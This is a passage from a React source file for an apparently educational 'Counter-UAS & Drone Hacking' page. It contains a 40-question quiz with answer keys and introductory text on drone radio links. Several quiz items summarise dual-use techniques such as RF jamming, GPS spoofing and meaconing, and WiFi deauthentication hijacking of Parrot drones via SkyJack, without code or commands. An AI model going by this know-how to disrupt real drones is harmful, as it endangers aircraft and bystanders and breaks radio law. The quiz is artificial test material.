import React, { useState } from "react";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Alert,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Grid,
  IconButton,
  Tooltip,
  Divider,
  alpha,
  useTheme,
  useMediaQuery,
  Drawer,
  Fab,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import FlightIcon from "@mui/icons-material/Flight";
import RadarIcon from "@mui/icons-material/Radar";
import SecurityIcon from "@mui/icons-material/Security";
import BuildIcon from "@mui/icons-material/Build";
import SearchIcon from "@mui/icons-material/Search";
import BugReportIcon from "@mui/icons-material/BugReport";
import ShieldIcon from "@mui/icons-material/Shield";
import GavelIcon from "@mui/icons-material/Gavel";
import QuizIcon from "@mui/icons-material/Quiz";
import SchoolIcon from "@mui/icons-material/School";
import ScienceIcon from "@mui/icons-material/Science";
import MenuBookIcon from "@mui/icons-material/MenuBook";
import WifiIcon from "@mui/icons-material/Wifi";
import SettingsRemoteIcon from "@mui/icons-material/SettingsRemote";
import GpsFixedIcon from "@mui/icons-material/GpsFixed";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import KeyboardArrowRightIcon from "@mui/icons-material/KeyboardArrowRight";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import MemoryIcon from "@mui/icons-material/Memory";
import CellTowerIcon from "@mui/icons-material/CellTower";
import HistoryEduIcon from "@mui/icons-material/HistoryEdu";
import SensorsIcon from "@mui/icons-material/Sensors";
import BlockIcon from "@mui/icons-material/Block";
import { useNavigate, Link } from "react-router-dom";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// Section Navigation Items
const sectionNavItems = [
  { id: "intro", label: "Introduction", icon: <SchoolIcon /> },
  { id: "drone-basics", label: "Drone Technology", icon: <FlightIcon /> },
  { id: "protocols", label: "Communication Protocols", icon: <WifiIcon /> },
  { id: "detection", label: "Detection Methods", icon: <RadarIcon /> },
  { id: "commercial-cuas", label: "Commercial C-UAS Systems", icon: <RadarIcon /> },
  { id: "military-cuas", label: "Military C-UAS Systems", icon: <ShieldIcon /> },
  { id: "counter-measures", label: "Counter-Measures", icon: <BlockIcon /> },
  { id: "gps-spoofing", label: "GPS Spoofing", icon: <GpsFixedIcon /> },
  { id: "rf-attacks", label: "RF Attacks", icon: <SensorsIcon /> },
  { id: "cyber-attacks", label: "Cyber Attacks", icon: <BugReportIcon /> },
  { id: "drone-forensics", label: "Drone Forensics", icon: <SearchIcon /> },
  { id: "tools", label: "Tools & Equipment", icon: <BuildIcon /> },
  { id: "case-studies", label: "Case Studies", icon: <HistoryEduIcon /> },
  { id: "open-source", label: "Open Source Projects", icon: <MemoryIcon /> },
  { id: "defense", label: "Drone Defense", icon: <ShieldIcon /> },
  { id: "labs", label: "Hands-On Labs", icon: <ScienceIcon /> },
  { id: "glossary", label: "Glossary", icon: <MenuBookIcon /> },
  { id: "resources", label: "Resources", icon: <MenuBookIcon /> },
  { id: "legal", label: "Legal & Ethics", icon: <GavelIcon /> },
  { id: "quiz-section", label: "Knowledge Check", icon: <QuizIcon /> },
];

// Theme colors
const theme = {
  primary: "#06b6d4",
  primaryLight: "#22d3ee",
  secondary: "#8b5cf6",
  accent: "#f59e0b",
  success: "#10b981",
  warning: "#f59e0b",
  info: "#3b82f6",
  error: "#ef4444",
  bgDark: "#0a0a0f",
  bgCard: "#12121a",
  bgNested: "#0f1024",
  bgCode: "#1a1a2e",
  border: "rgba(6, 182, 212, 0.2)",
  text: "#e2e8f0",
  textMuted: "#94a3b8",
};

const QUIZ_QUESTION_COUNT = 10;

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "What frequency band do most consumer drones use for control?",
    options: [
      "2.4 GHz and 5.8 GHz",
      "900 MHz only",
      "433 MHz only",
      "LTE cellular only",
    ],
    correctAnswer: 0,
    explanation: "Most consumer drones use 2.4 GHz for control signals and 5.8 GHz for video transmission, similar to WiFi frequencies.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "What does C-UAS stand for?",
    options: [
      "Counter-Unmanned Aircraft Systems",
      "Controlled Unmanned Aerial Surveillance",
      "Commercial UAS Standards",
      "Civilian UAV Security",
    ],
    correctAnswer: 0,
    explanation: "C-UAS stands for Counter-Unmanned Aircraft Systems, referring to technologies and methods used to detect, track, and neutralize drones.",
  },
  {
    id: 3,
    topic: "Detection",
    question: "Which detection method works best for small drones at close range?",
    options: [
      "RF detection (analyzing control signals)",
      "Primary radar only",
      "Satellite imaging",
      "Seismic sensors",
    ],
    correctAnswer: 0,
    explanation: "RF detection is highly effective for small drones at close range as it can detect the control link and video transmission signals.",
  },
  {
    id: 4,
    topic: "Protocols",
    question: "What protocol does DJI use for drone communication?",
    options: [
      "OcuSync / Lightbridge",
      "MAVLink only",
      "Bluetooth Low Energy",
      "ZigBee",
    ],
    correctAnswer: 0,
    explanation: "DJI uses proprietary protocols called OcuSync (newer models) and Lightbridge (older models) for drone-controller communication.",
  },
  {
    id: 5,
    topic: "Counter-Measures",
    question: "What is drone jamming?",
    options: [
      "Overwhelming drone control frequencies with interference",
      "Physically capturing drones with nets",
      "Hacking into drone firmware",
      "Using trained birds to intercept drones",
    ],
    correctAnswer: 0,
    explanation: "Drone jamming involves transmitting interference on control frequencies (2.4/5.8 GHz) to disrupt the link between drone and operator.",
  },
  {
    id: 6,
    topic: "GPS",
    question: "What happens to most drones when GPS is spoofed?",
    options: [
      "They may fly to incorrect locations or land unexpectedly",
      "They always crash immediately",
      "They switch to cellular backup",
      "They become invisible to radar",
    ],
    correctAnswer: 0,
    explanation: "GPS spoofing can cause drones to navigate to wrong locations, trigger geofencing responses, or initiate return-to-home to a spoofed location.",
  },
  {
    id: 7,
    topic: "Protocols",
    question: "What is MAVLink?",
    options: [
      "Open-source protocol for drone telemetry and control",
      "DJI's proprietary video codec",
      "Military drone encryption standard",
      "Drone registration database",
    ],
    correctAnswer: 0,
    explanation: "MAVLink (Micro Air Vehicle Link) is a lightweight, open-source protocol used for communication between drones and ground stations.",
  },
  {
    id: 8,
    topic: "Detection",
    question: "What is acoustic detection of drones based on?",
    options: [
      "Recognizing unique sound signatures of drone motors/propellers",
      "Echolocation like sonar",
      "Detecting radio emissions",
      "Measuring air pressure changes",
    ],
    correctAnswer: 0,
    explanation: "Acoustic detection uses microphone arrays to identify the distinctive sound patterns created by drone propellers and motors.",
  },
  {
    id: 9,
    topic: "Counter-Measures",
    question: "What is a 'geofence' in drone context?",
    options: [
      "Virtual boundary that restricts drone flight in certain areas",
      "Physical fence to catch drones",
      "Encryption boundary for secure communications",
      "Registration zone for commercial drones",
    ],
    correctAnswer: 0,
    explanation: "Geofencing creates virtual boundaries using GPS coordinates that prevent or restrict drone flight in sensitive areas like airports.",
  },
  {
    id: 10,
    topic: "Cyber",
    question: "What vulnerability allows WiFi-based drone hijacking?",
    options: [
      "Weak or default WiFi credentials and unencrypted links",
      "Hardware backdoors only",
      "Solar interference",
      "Battery depletion attacks",
    ],
    correctAnswer: 0,
    explanation: "Many consumer drones use WiFi with weak/default passwords or unencrypted video streams, allowing attackers to intercept or take control.",
  },
  {
    id: 11,
    topic: "Tools",
    question: "What is an SDR used for in drone security research?",
    options: [
      "Analyzing and potentially transmitting on drone frequencies",
      "Programming drone firmware only",
      "3D printing drone parts",
      "Drone flight simulation",
    ],
    correctAnswer: 0,
    explanation: "Software Defined Radio (SDR) allows researchers to receive, analyze, and (with proper hardware) transmit on drone control frequencies.",
  },
  {
    id: 12,
    topic: "Detection",
    question: "What is radar cross-section (RCS) and why is it relevant to drones?",
    options: [
      "Measure of radar detectability - small drones have low RCS",
      "Drone camera resolution metric",
      "Control signal strength measurement",
      "Battery capacity indicator",
    ],
    correctAnswer: 0,
    explanation: "RCS measures how detectable an object is by radar. Small drones have very low RCS, making them difficult to detect with traditional radar.",
  },
  {
    id: 13,
    topic: "GPS",
    question: "What is 'GPS denial' in counter-drone operations?",
    options: [
      "Jamming GPS signals to prevent drone navigation",
      "Removing GPS chips from captured drones",
      "Legal restrictions on GPS use",
      "Encrypting GPS coordinates",
    ],
    correctAnswer: 0,
    explanation: "GPS denial involves jamming the GPS frequency band (L1: 1575.42 MHz) to prevent drones from receiving positioning data.",
  },
  {
    id: 14,
    topic: "Protocols",
    question: "What frequency does DJI's Remote ID broadcast on?",
    options: [
      "2.4 GHz (WiFi Beacon or Bluetooth)",
      "900 MHz",
      "5G cellular",
      "Satellite frequency",
    ],
    correctAnswer: 0,
    explanation: "DJI Remote ID broadcasts drone identification on 2.4 GHz using either WiFi beacon frames or Bluetooth, allowing nearby receivers to identify the drone.",
  },
  {
    id: 15,
    topic: "Counter-Measures",
    question: "What is a 'drone gun' or RF jammer?",
    options: [
      "Directional device that jams drone control frequencies",
      "Firearm that shoots drones",
      "Device that programs drones remotely",
      "Drone-mounted weapon system",
    ],
    correctAnswer: 0,
    explanation: "A drone gun is a directional RF jammer that disrupts drone control links, typically causing the drone to land or return home.",
  },
  {
    id: 16,
    topic: "Fundamentals",
    question: "What is FPV in drone terminology?",
    options: [
      "First Person View - live video from drone camera",
      "Flight Path Verification",
      "Frequency Power Variance",
      "Federal Pilot Verification",
    ],
    correctAnswer: 0,
    explanation: "FPV (First Person View) refers to flying a drone using a real-time video feed from an onboard camera, typically on 5.8 GHz.",
  },
  {
    id: 17,
    topic: "Cyber",
    question: "What is 'SkyJack' in drone hacking context?",
    options: [
      "Tool to hijack Parrot drones via WiFi deauth attacks",
      "Commercial drone tracking service",
      "Military drone encryption",
      "Drone delivery hijacking insurance",
    ],
    correctAnswer: 0,
    explanation: "SkyJack is a tool that uses WiFi deauthentication attacks to disconnect Parrot drones from their controllers and take control.",
  },
  {
    id: 18,
    topic: "Detection",
    question: "What advantage does multi-sensor fusion provide in C-UAS?",
    options: [
      "Combines multiple detection methods to reduce false positives",
      "Increases jamming power",
      "Allows faster drone capture",
      "Reduces equipment costs",
    ],
    correctAnswer: 0,
    explanation: "Multi-sensor fusion combines RF, radar, acoustic, and optical detection to improve accuracy and reduce false alarms.",
  },
  {
    id: 19,
    topic: "Protocols",
    question: "What is the typical range of consumer drone control links?",
    options: [
      "1-10 km depending on frequency and power",
      "100+ km standard",
      "Less than 100 meters always",
      "Unlimited with satellite",
    ],
    correctAnswer: 0,
    explanation: "Consumer drones typically have 1-10 km control range, with DJI models reaching up to 15 km in optimal conditions.",
  },
  {
    id: 20,
    topic: "Legal",
    question: "What makes drone jamming legally complex in most countries?",
    options: [
      "It disrupts licensed radio spectrum and may affect other devices",
      "Drones are protected by aviation law",
      "Jamming equipment is too expensive",
      "International drone treaties prohibit it",
    ],
    correctAnswer: 0,
    explanation: "Jamming is illegal in most countries because it interferes with licensed spectrum and can disrupt legitimate communications and navigation.",
  },
  {
    id: 21,
    topic: "GPS",
    question: "What is 'meaconing' in GPS spoofing?",
    options: [
      "Rebroadcasting delayed GPS signals to cause position errors",
      "Tracking drone movements via GPS",
      "Encrypting GPS data",
      "Boosting GPS signal strength",
    ],
    correctAnswer: 0,
    explanation: "Meaconing involves receiving GPS signals and rebroadcasting them with delays, causing receivers to calculate incorrect positions.",
  },
  {
    id: 22,
    topic: "Counter-Measures",
    question: "What is a 'drone net gun'?",
    options: [
      "Launches nets to physically capture drones in flight",
      "Network security tool for drones",
      "WiFi analysis device",
      "Software firewall for drone systems",
    ],
    correctAnswer: 0,
    explanation: "Drone net guns are kinetic countermeasures that launch nets to entangle and capture drones, often with parachutes for safe descent.",
  },
  {
    id: 23,
    topic: "Fundamentals",
    question: "What is BVLOS in drone operations?",
    options: [
      "Beyond Visual Line of Sight operations",
      "Battery Voltage Level Operating System",
      "Basic Visual Landing Operation Standard",
      "Broadcast Video Link Operating Spectrum",
    ],
    correctAnswer: 0,
    explanation: "BVLOS (Beyond Visual Line of Sight) refers to drone operations where the pilot cannot directly see the drone, requiring additional safety measures.",
  },
  {
    id: 24,
    topic: "Tools",
    question: "What is DroneID sniffer used for?",
    options: [
      "Capturing and decoding drone Remote ID broadcasts",
      "Identifying drone pilots by facial recognition",
      "Tracking drone battery levels",
      "Programming new drone identities",
    ],
    correctAnswer: 0,
    explanation: "DroneID sniffers capture Remote ID broadcasts to identify drone serial numbers, locations, and operator positions.",
  },
  {
    id: 25,
    topic: "RF",
    question: "Why is 5.8 GHz commonly used for drone FPV video?",
    options: [
      "Higher bandwidth for video with less interference from control link",
      "Longer range than 2.4 GHz",
      "Required by law for video transmission",
      "Only frequency that works with cameras",
    ],
    correctAnswer: 0,
    explanation: "5.8 GHz provides higher bandwidth needed for video while avoiding interference with the 2.4 GHz control link.",
  },
  {
    id: 26,
    topic: "Cyber",
    question: "What vulnerability do many toy drones have?",
    options: [
      "Open WiFi access points with no authentication",
      "Military-grade encryption only",
      "Hardened firmware",
      "Satellite communication backdoors",
    ],
    correctAnswer: 0,
    explanation: "Many toy/cheap drones create open WiFi access points for control, allowing anyone nearby to connect and take control.",
  },
  {
    id: 27,
    topic: "Detection",
    question: "What is the primary limitation of visual/optical drone detection?",
    options: [
      "Weather dependency and limited range at night",
      "Cannot detect any drones",
      "Too expensive to deploy",
      "Only works indoors",
    ],
    correctAnswer: 0,
    explanation: "Optical/visual detection is limited by weather (fog, rain), lighting conditions, and struggles with small drones at distance.",
  },
  {
    id: 28,
    topic: "Counter-Measures",
    question: "What is 'protocol manipulation' in drone attacks?",
    options: [
      "Exploiting weaknesses in drone communication protocols",
      "Changing international drone regulations",
      "Updating firmware over-the-air",
      "Standardizing drone frequencies",
    ],
    correctAnswer: 0,
    explanation: "Protocol manipulation exploits vulnerabilities in MAVLink, WiFi, or proprietary protocols to inject commands or disrupt communications.",
  },
  {
    id: 29,
    topic: "GPS",
    question: "What civilian GPS signal is most commonly spoofed?",
    options: [
      "L1 C/A (1575.42 MHz)",
      "L5 (1176.45 MHz)",
      "Military P(Y) code",
      "Galileo E6",
    ],
    correctAnswer: 0,
    explanation: "The L1 C/A (Coarse/Acquisition) signal at 1575.42 MHz is unencrypted and most commonly used by consumer GPS receivers.",
  },
  {
    id: 30,
    topic: "Tools",
    question: "What is Wireshark used for in drone security?",
    options: [
      "Capturing and analyzing drone network traffic",
      "Controlling drones remotely",
      "Jamming drone frequencies",
      "Programming flight paths",
    ],
    correctAnswer: 0,
    explanation: "Wireshark captures and analyzes network packets from WiFi-based drones, revealing protocols, commands, and potential vulnerabilities.",
  },
  {
    id: 31,
    topic: "Commercial",
    question: "What company makes the DroneGun Tactical handheld jammer?",
    options: [
      "DroneShield",
      "Dedrone",
      "Anduril",
      "DJI",
    ],
    correctAnswer: 0,
    explanation: "DroneShield, an Australian company, manufactures the DroneGun Tactical, a widely-used handheld RF jammer for C-UAS operations.",
  },
  {
    id: 32,
    topic: "Military",
    question: "What makes directed energy weapons attractive for C-UAS?",
    options: [
      "Nearly unlimited shots at very low cost per engagement",
      "They are completely silent",
      "They work in all weather conditions",
      "They are legal everywhere",
    ],
    correctAnswer: 0,
    explanation: "Directed energy weapons (lasers, HPM) have essentially unlimited magazines and cost only dollars per shot, making them ideal against cheap drone swarms.",
  },
  {
    id: 33,
    topic: "Commercial",
    question: "What unique capability does D-Fend's EnforceAir system offer?",
    options: [
      "Cyber-takeover for controlled landing of hostile drones",
      "Kinetic destruction only",
      "Satellite-based tracking",
      "Acoustic-only detection",
    ],
    correctAnswer: 0,
    explanation: "D-Fend specializes in cyber-takeover technology that actually hijacks rogue drones and lands them safely, allowing forensic recovery.",
  },
  {
    id: 34,
    topic: "Military",
    question: "What is the Epirus Leonidas system designed for?",
    options: [
      "Counter-swarm operations using high-power microwave",
      "Long-range missile defense",
      "Underwater drone detection",
      "Satellite communication jamming",
    ],
    correctAnswer: 0,
    explanation: "Epirus Leonidas uses solid-state high-power microwave (HPM) technology to neutralize multiple drones simultaneously in swarm attacks.",
  },
  {
    id: 35,
    topic: "Case Study",
    question: "What was the impact of the 2018 Gatwick Airport drone incident?",
    options: [
      "~1,000 flights cancelled, 140,000 passengers affected",
      "Minor delay of a few flights",
      "Complete destruction of airport facilities",
      "No significant impact",
    ],
    correctAnswer: 0,
    explanation: "The Gatwick incident was one of the most significant drone disruption events, causing massive travel chaos over 3 days with the perpetrators never identified.",
  },
  {
    id: 36,
    topic: "Case Study",
    question: "What was targeted in the 2019 Saudi Aramco drone attack?",
    options: [
      "World's largest oil processing facility at Abqaiq",
      "A military base",
      "A civilian airport",
      "A government building",
    ],
    correctAnswer: 0,
    explanation: "The Abqaiq-Khurais attack targeted Saudi Aramco's oil processing facility, halting 5% of global oil production and causing oil prices to spike 15%.",
  },
  {
    id: 37,
    topic: "Forensics",
    question: "What key evidence can be recovered from a captured DJI drone?",
    options: [
      "Flight logs with GPS coordinates including operator location",
      "Operator's fingerprints only",
      "Nothing due to encryption",
      "Only the current battery level",
    ],
    correctAnswer: 0,
    explanation: "DJI drones store flight logs containing timestamps, GPS coordinates, and crucially, the controller's GPS position which can identify the operator's location.",
  },
  {
    id: 38,
    topic: "Open Source",
    question: "What does the OpenDroneID project provide?",
    options: [
      "Tools for receiving and decoding Remote ID broadcasts",
      "Commercial drone tracking services",
      "Drone jamming capabilities",
      "Military encryption standards",
    ],
    correctAnswer: 0,
    explanation: "OpenDroneID is an open-source project providing libraries and apps for receiving drone Remote ID broadcasts via WiFi and Bluetooth.",
  },
  {
    id: 39,
    topic: "Military",
    question: "What lesson from Ukraine changed military C-UAS thinking?",
    options: [
      "Cheap FPV drones can destroy expensive equipment, requiring mass C-UAS",
      "Traditional air defense is sufficient",
      "Drones are not effective in warfare",
      "Electronic warfare doesn't work",
    ],
    correctAnswer: 0,
    explanation: "The Ukraine conflict showed that $500 FPV kamikaze drones can destroy million-dollar tanks, driving demand for mass-producible C-UAS solutions.",
  },
  {
    id: 40,
    topic: "Commercial",
    question: "What is Anduril's Anvil?",
    options: [
      "An autonomous interceptor drone that physically collides with targets",
      "A ground-based radar system",
      "A laser weapon",
      "A network monitoring tool",
    ],
    correctAnswer: 0,
    explanation: "Anvil is Anduril's kinetic kill vehicle - an autonomous interceptor drone that tracks and physically collides with hostile drones to neutralize them.",
  },
];

// Code block component
const CodeBlock: React.FC<{ code: string; language?: string }> = ({
  code,
  language = "bash",
}) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <Paper
      sx={{
        p: 2,
        bgcolor: theme.bgCode,
        borderRadius: 2,
        position: "relative",
        my: 2,
        border: `1px solid ${theme.border}`,
      }}
    >
      <Box sx={{ position: "absolute", top: 8, right: 8 }}>
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: theme.textMuted }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Typography
        component="pre"
        sx={{
          fontFamily: "monospace",
          fontSize: "0.85rem",
          color: theme.text,
          whiteSpace: "pre-wrap",
          wordBreak: "break-all",
          m: 0,
          pr: 4,
        }}
      >
        {code}
      </Typography>
    </Paper>
  );
};

const CounterUASPage: React.FC = () => {
  const navigate = useNavigate();
  const muiTheme = useTheme();
  const isMobile = useMediaQuery(muiTheme.breakpoints.down("md"));
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
    setNavDrawerOpen(false);
  };

  const scrollToTop = () => {
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  // Sidebar navigation
  const sidebarNav = (
    <Box sx={{ position: "sticky", top: 24 }}>
      <Paper
        sx={{
          bgcolor: theme.bgCard,
          border: `1px solid ${theme.border}`,
          borderRadius: 2,
          p: 2,
        }}
      >
        <Typography variant="subtitle2" sx={{ color: theme.primary, mb: 2, fontWeight: 600 }}>
          NAVIGATION
        </Typography>
        <List dense disablePadding>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              component="button"
              onClick={() => scrollToSection(item.id)}
              sx={{
                borderRadius: 1,
                mb: 0.5,
                cursor: "pointer",
                border: "none",
                bgcolor: "transparent",
                width: "100%",
                textAlign: "left",
                "&:hover": {
                  bgcolor: alpha(theme.primary, 0.1),
                },
              }}
            >
              <ListItemIcon sx={{ minWidth: 32, color: theme.primary }}>
                {item.icon}
              </ListItemIcon>
              <ListItemText
                primary={item.label}
                primaryTypographyProps={{
                  variant: "body2",
                  sx: { color: theme.text },
                }}
              />
            </ListItem>
          ))}
        </List>
      </Paper>
    </Box>
  );

  return (
    <LearnPageLayout
      pageTitle="Counter-UAS & Drone Hacking"
      pageContext="This page covers Counter-Unmanned Aircraft Systems (C-UAS) security, including drone technology, detection methods, counter-measures, GPS spoofing, RF attacks, and defensive techniques. Focus on educational content about drone security research."
    >
      <Box sx={{ bgcolor: theme.bgDark, minHeight: "100vh", py: 4 }}>
        <Container maxWidth="xl">
          <Grid container spacing={3}>
            {/* Sidebar - Desktop */}
            <Grid item md={3} sx={{ display: { xs: "none", md: "block" } }}>
              {sidebarNav}
            </Grid>

            {/* Main Content */}
            <Grid item xs={12} md={9}>
              {/* Back to Learning Hub */}
              <Chip
                component={Link}
                to="/learn"
                icon={<ArrowBackIcon />}
                label="Back to Learning Hub"
                clickable
                variant="outlined"
                sx={{
                  mb: 3,
                  borderColor: theme.primary,
                  color: theme.primary,
                  "&:hover": {
                    bgcolor: alpha(theme.primary, 0.1),
                    borderColor: theme.primaryLight,
                  },
                }}
              />

              {/* Header */}
              <Paper
                sx={{
                  p: 4,
                  mb: 4,
                  bgcolor: theme.bgCard,
                  border: `1px solid ${theme.border}`,
                  borderRadius: 2,
                  background: `linear-gradient(135deg, ${theme.bgCard} 0%, ${alpha(theme.primary, 0.1)} 100%)`,
                }}
              >
                <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                  <FlightIcon sx={{ fontSize: 48, color: theme.primary }} />
                  <Box>
                    <Typography variant="h4" sx={{ color: theme.text, fontWeight: 700 }}>
                      Counter-UAS & Drone Hacking
                    </Typography>
                    <Typography variant="subtitle1" sx={{ color: theme.textMuted }}>
                      Detection, Tracking, and Neutralization of Unmanned Aircraft
                    </Typography>
                  </Box>
                </Box>
                <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", mt: 2 }}>
                  <Chip label="C-UAS" size="small" sx={{ bgcolor: alpha(theme.primary, 0.2), color: theme.primary }} />
                  <Chip label="RF Analysis" size="small" sx={{ bgcolor: alpha(theme.secondary, 0.2), color: theme.secondary }} />
                  <Chip label="GPS Spoofing" size="small" sx={{ bgcolor: alpha(theme.accent, 0.2), color: theme.accent }} />
                  <Chip label="Protocol Exploitation" size="small" sx={{ bgcolor: alpha(theme.info, 0.2), color: theme.info }} />
                </Box>
              </Paper>

              {/* Introduction Section */}
              <Box id="intro" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <SchoolIcon /> Introduction to Counter-UAS
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Counter-Unmanned Aircraft Systems (C-UAS) encompasses technologies and techniques used to detect, track,
                    identify, and neutralize unauthorized drones. As drone technology becomes more accessible, understanding
                    both offensive and defensive capabilities is crucial for security professionals.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>What exactly is C-UAS?</strong> Think of it as the complete ecosystem of tools, techniques, and 
                    procedures used to deal with unwanted drones. Just like traditional air defense protects against manned 
                    aircraft, C-UAS protects sensitive areas from drones that could be used for surveillance, smuggling, 
                    or even attacks. This includes everything from simply detecting that a drone is present, to identifying 
                    what type it is and who's flying it, to actually stopping it if necessary.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>Why should security professionals care?</strong> Consumer drones have become incredibly capable 
                    and affordable. A few hundred dollars can buy a drone with high-resolution cameras, GPS navigation, and 
                    the ability to fly autonomously on pre-programmed routes. This democratization of drone technology means 
                    that bad actors can easily acquire and operate drones for malicious purposes. From spying on corporate 
                    facilities to smuggling contraband into prisons, drones present real and growing security challenges.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The security research perspective:</strong> Understanding how drones work—their communication 
                    protocols, navigation systems, and vulnerabilities—enables security researchers to develop better 
                    defenses. By studying drone hacking techniques, you'll learn how attackers might exploit weaknesses 
                    in drone systems, and more importantly, how to protect against these attacks. This knowledge is 
                    increasingly valuable as organizations seek experts who can assess and mitigate drone-related risks.
                  </Typography>
                  <Alert severity="warning" sx={{ mb: 2, bgcolor: alpha(theme.warning, 0.1), color: theme.text }}>
                    <Typography variant="body2">
                      <strong>Legal Notice:</strong> Many counter-drone techniques (jamming, spoofing, interception) are
                      illegal without proper authorization. This content is for educational purposes and authorized
                      security research only. Always obtain proper permissions before testing any techniques, even on 
                      your own equipment, as transmitting on certain frequencies or interfering with aircraft is 
                      regulated by federal law in most countries.
                    </Typography>
                  </Alert>

                  <Grid container spacing={2} sx={{ mb: 2 }}>
                    <Grid item xs={12} md={4}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, height: "100%" }}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                          <RadarIcon sx={{ color: theme.primary }} />
                          <Typography variant="subtitle2" sx={{ color: theme.primary, fontWeight: 600 }}>Detection</Typography>
                        </Box>
                        <Typography variant="body2" sx={{ color: theme.textMuted }}>
                          RF sensing, radar, acoustic, optical/thermal detection methods
                        </Typography>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={4}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, height: "100%" }}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                          <GpsFixedIcon sx={{ color: theme.accent }} />
                          <Typography variant="subtitle2" sx={{ color: theme.accent, fontWeight: 600 }}>Tracking</Typography>
                        </Box>
                        <Typography variant="body2" sx={{ color: theme.textMuted }}>
                          Direction finding, triangulation, trajectory prediction
                        </Typography>
                      </Paper>
                    </Grid>
                    <Grid item xs={12} md={4}>
                      <Paper sx={{ p: 2, bgcolor: theme.bgNested, height: "100%" }}>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                          <BlockIcon sx={{ color: theme.error }} />
                          <Typography variant="subtitle2" sx={{ color: theme.error, fontWeight: 600 }}>Neutralization</Typography>
                        </Box>
                        <Typography variant="body2" sx={{ color: theme.textMuted }}>
                          Jamming, spoofing, cyber attacks, kinetic methods
                        </Typography>
                      </Paper>
                    </Grid>
                  </Grid>

                  <Box sx={{ bgcolor: theme.bgNested, p: 2, borderRadius: 1 }}>
                    <Typography variant="subtitle2" sx={{ color: theme.secondary, mb: 1 }}>
                      Why Study Counter-UAS Security?
                    </Typography>
                    <List dense>
                      {[
                        "Drones pose risks to critical infrastructure, airports, and events",
                        "Understanding attacks helps build better defenses",
                        "Growing demand for C-UAS expertise in security industry",
                        "Research enables development of safer drone systems",
                        "Legal security testing requires deep protocol knowledge",
                      ].map((item, idx) => (
                        <ListItem key={idx} sx={{ py: 0.5 }}>
                          <ListItemIcon sx={{ minWidth: 32 }}>
                            <KeyboardArrowRightIcon sx={{ color: theme.secondary }} />
                          </ListItemIcon>
                          <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", sx: { color: theme.text } }} />
                        </ListItem>
                      ))}
                    </List>
                  </Box>
                </Paper>
              </Box>

              {/* Drone Technology Section */}
              <Box id="drone-basics" sx={{ mb: 4 }}>
                <Paper sx={{ p: 3, bgcolor: theme.bgCard, border: `1px solid ${theme.border}`, borderRadius: 2 }}>
                  <Typography variant="h5" sx={{ color: theme.primary, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <FlightIcon /> Drone Technology Fundamentals
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    Understanding drone architecture and components is essential for effective counter-drone operations.
                    Before you can defend against drones or understand their vulnerabilities, you need to know how they work.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>How do drones actually fly?</strong> Most consumer and commercial drones are "multirotors"—typically 
                    quadcopters with four motors. Each motor spins a propeller that generates lift. By varying the speed of 
                    individual motors, the drone can move in any direction: speed up the rear motors to pitch forward, speed 
                    up the left motors to roll right, and so on. A sophisticated computer called the "flight controller" 
                    manages all of this thousands of times per second, using data from onboard sensors (gyroscopes, 
                    accelerometers, barometers, GPS) to maintain stability and navigate.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 2 }}>
                    <strong>The communication link:</strong> Drones need to communicate with their operators. This typically 
                    happens over radio frequencies—most commonly 2.4 GHz for control commands and 5.8 GHz for video transmission. 
                    These are the same frequencies used by WiFi routers, which is convenient but also creates security 
                    implications. The control link sends commands from the pilot's controller to the drone, while the video 
                    link sends live camera footage back to the pilot. Understanding these links is crucial for both detecting 
                    and potentially disrupting drone operations.
                  </Typography>
                  <Typography variant="body2" sx={{ color: theme.text, mb: 3 }}>
